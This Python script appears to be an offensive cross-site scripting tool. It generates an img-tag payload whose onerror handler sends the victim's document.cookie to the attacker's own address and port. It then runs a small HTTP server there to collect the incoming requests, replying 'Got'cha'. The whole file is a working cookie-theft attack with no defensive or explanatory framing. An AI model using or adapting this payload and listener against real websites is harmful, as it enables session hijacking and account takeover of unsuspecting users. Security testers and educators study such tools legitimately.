#!/usr/bin/env python

import util
import sys
import http.server
import socketserver
from http.server import HTTPServer, BaseHTTPRequestHandler

def generatePayload(type, address, port):
    if type == "img":
        return '<img src="#" onerror="javascript:document.location=\'http://%s:%d/?x=\'+document.cookie">' % (address, port)
    else:
        return None

class XssServer(BaseHTTPRequestHandler):
    def _set_headers(self):
        self.send_response(200)
        self.send_header("Content-type", "text/html")
        self.end_headers()

    def _html(self):
        content = f"<html><body><h1>Got'cha</h1></body></html>"
        return content.encode("utf8")  # NOTE: must return a bytes object!

    def do_GET(self):
        self._set_headers()
        self.wfile.write(self._html())

    def do_HEAD(self):
        self._set_headers()

    def do_POST(self):
        self._set_headers()
        self.wfile.write(self._html())

if __name__ == "__main__":

    if len(sys.argv) < 2:
        print("Usage: %s <type> [port]" % sys.argv[0])
        exit(1)

    listen_port = None if len(sys.argv) < 3 else int(sys.argv[2])
    payload_type = sys.argv[1].lower()

    local_address = util.getAddress()

    # choose random port
    if listen_port is None:
        sock = util.openServer(local_address)
        if not sock:
            exit(1)
        listen_port = sock.getsockname()[1]
        sock.close()

    payload = generatePayload(payload_type, local_address, listen_port)
    if not payload:
        print("Unsupported payload type, choose one of: img")
        exit(1)

    print("Payload:")
    print(payload)
    print()

    httpd = HTTPServer((local_address, listen_port), XssServer)
    print(f"Starting httpd server on {local_address}:{listen_port}")
    httpd.serve_forever()
